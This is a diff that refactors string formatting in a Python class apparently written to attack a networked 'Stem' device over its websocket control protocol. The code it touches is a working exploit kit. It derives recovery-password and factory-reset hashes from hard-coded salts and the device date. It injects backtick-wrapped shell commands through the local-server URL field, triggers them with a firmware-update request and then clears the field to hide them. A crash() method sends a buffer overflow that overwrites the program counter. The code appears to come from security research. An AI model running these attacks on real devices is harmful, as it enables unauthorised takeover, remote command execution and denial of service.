@@ -29,50 +29,51 @@ class StemDevice():
             self.connections['control'] = {'port' : ports['control']}
             self.connections['http'] =    {'port' : ports['http']}
         except KeyError as e:
-            print('Port not provided: ' + str(e))
+            print(f'Port not provided: {str(e)}')
 
     @staticmethod
     def __generate_recovery_pw_hash(date):
         dateStr = date
-        pwRecoverStr = dateStr[0] + "sTw7iFF" + dateStr[1] + "j20X" + dateStr[2] + "1z" + dateStr[3] + "3" + dateStr[4] + "Cd" + dateStr[5]
+        pwRecoverStr = f"{dateStr[0]}sTw7iFF{dateStr[1]}j20X{dateStr[2]}1z{dateStr[3]}3{dateStr[4]}Cd{dateStr[5]}"
+
 
         pwRecoverHash = numpy.int32(0)
         for c in pwRecoverStr:
             pwRecoverHash = numpy.int32((pwRecoverHash*23) + ord(c))
-        return ';' + str(pwRecoverHash) + ';'
+        return f';{str(pwRecoverHash)};'
 
     @staticmethod
     def __generate_factory_reset_hash(date):
-        dateStr = date 
-        factoryResetStr = dateStr[0] + "lol393a" + dateStr[1] + "leet" + dateStr[2] + "ww" + dateStr[3] + "Q" + dateStr[4] + "2f" + dateStr[5]
+        dateStr = date
+        factoryResetStr = f"{dateStr[0]}lol393a{dateStr[1]}leet{dateStr[2]}ww{dateStr[3]}Q{dateStr[4]}2f{dateStr[5]}"
+
 
         factoryResetHash = numpy.int32(0)
         for c in factoryResetStr:
             factoryResetHash = numpy.int32(factoryResetHash*23 + ord(c))
-        return ';' + str(factoryResetHash) + ';'
+        return f';{str(factoryResetHash)};'
 
     def __send_leave_org_req(self, pw_hash): 
         stem.connect('control')
-        stem.send('control', '@STEM_ORG_LEAVE_REQ:' + pw_hash)
+        stem.send('control', f'@STEM_ORG_LEAVE_REQ:{pw_hash}')
         return stem.recv('control')
 
     def get_date(self):
         stem.connect('control')
-        stem.send('control', self.ip + '@STEM_DATETIME_GET_REQ:255.255.255.255')
+        stem.send('control', f'{self.ip}@STEM_DATETIME_GET_REQ:255.255.255.255')
         ret = stem.recv('control')
 
-        if 'STEM_DATETIME_GET_RSP' not in ret:
-            return None
-
-        # 2021-02-25-...
-        # Take the first 10 chars
-        return ret.split(':')[1][:10]
+        return None if 'STEM_DATETIME_GET_RSP' not in ret else ret.split(':')[1][:10]
 
     def __light_test(self, color, state):
-        req = self.ip + '@STEM_DEVICE_' + color.upper() +\
-            '_LIGHT_TEST_' + state.upper() + ':'
+        req = (
+            (f'{self.ip}@STEM_DEVICE_{color.upper()}' + '_LIGHT_TEST_')
+            + state.upper()
+            + ':'
+        )
+
         stem.connect('control')
-        stem.send('control', req + ':')
+        stem.send('control', f'{req}:')
 
     # Any 'off' color works
     def light_test_off(self):
@@ -143,37 +144,35 @@ class StemDevice():
         self.connect('control')
 
         # The injected command
-        req0 = self.ip + '@STEM_LOCAL_SERVER_URL_SET_REQ:`' +\
-            cmd +\
-            '`;;;'
+        req0 = ((f'{self.ip}@STEM_LOCAL_SERVER_URL_SET_REQ:`' + cmd) + '`;;;')
         self.send('control', req0)
 
         if 'STEM_LOCAL_SERVER_URL_SET_RSP' not in self.recv('control'):
             return
 
         # The trigger
-        req1 = self.ip + '@STEM_FW_UPDATE_NOW_REQ:'
+        req1 = f'{self.ip}@STEM_FW_UPDATE_NOW_REQ:'
         self.send('control', req1)
 
         if 'STEM_FW_UPDATE_NOW_RSP' not in self.recv('control'):
             return
 
         # Reset the fields so as to not contain our commands
-        self.send('control', self.ip + '@STEM_LOCAL_SERVER_URL_SET_REQ:;;;')
+        self.send('control', f'{self.ip}@STEM_LOCAL_SERVER_URL_SET_REQ:;;;')
 
     def crash(self):
         self.connect('control')
-        req0  = bytes(self.ip + '@STEM_LOCAL_SERVER_URL_SET_REQ:', 'utf-8')
+        req0 = bytes(f'{self.ip}@STEM_LOCAL_SERVER_URL_SET_REQ:', 'utf-8')
         req0 += struct.pack('c', b'A') * (0x68 - 30)    # Buffer size less used bytes
         req0 += struct.pack('<I', 0x44444444)           # PC
         req0 += bytes(';;;', 'utf-8')
 
-        self.send('control', str(req0, 'utf-8')) 
+        self.send('control', str(req0, 'utf-8'))
         if 'STEM_LOCAL_SERVER_URL_SET_RSP' not in self.recv('control'):
             return
 
         # The trigger
-        req1 = self.ip + '@STEM_LOCAL_SERVER_URL_GET_REQ:'
+        req1 = f'{self.ip}@STEM_LOCAL_SERVER_URL_GET_REQ:'
         self.send('control', req1)
         print('Device should begin rebooting in ~15 seconds')
 
@@ -205,26 +204,26 @@ class StemDevice():
 
     def reboot(self):
         stem.connect('control')
-        stem.send('control', self.ip + '@STEM_SYSTEM_RESTART_REQ:')
+        stem.send('control', f'{self.ip}@STEM_SYSTEM_RESTART_REQ:')
 
     def __service_check(self, service):
         if service not in StemDevice.SERVICE_NAMES:
-            raise Exception('Unsupported service: ' + str(service))
+            raise Exception(f'Unsupported service: {str(service)}')
 
     def connect(self, service):
         self.__service_check(service)
 
         # Already connected
-        if None != self.connections[service].get('conn'):
+        if self.connections[service].get('conn') != None:
             return
 
         port = self.connections[service]['port']
         try:
             if 'control' in service:
-                conn = websockets.connect('ws://' + self.ip + ':' + port)
+                conn = websockets.connect(f'ws://{self.ip}:{port}')
                 conn = asyncio.get_event_loop().run_until_complete(conn)
             elif 'http' in service:
-                conn = http.client.HTTPConnection(self.ip + ':' + port)
+                conn = http.client.HTTPConnection(f'{self.ip}:{port}')
             else:
                 conn = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)
                 conn.connect((self.ip, int(self.connections[service]['port'])))
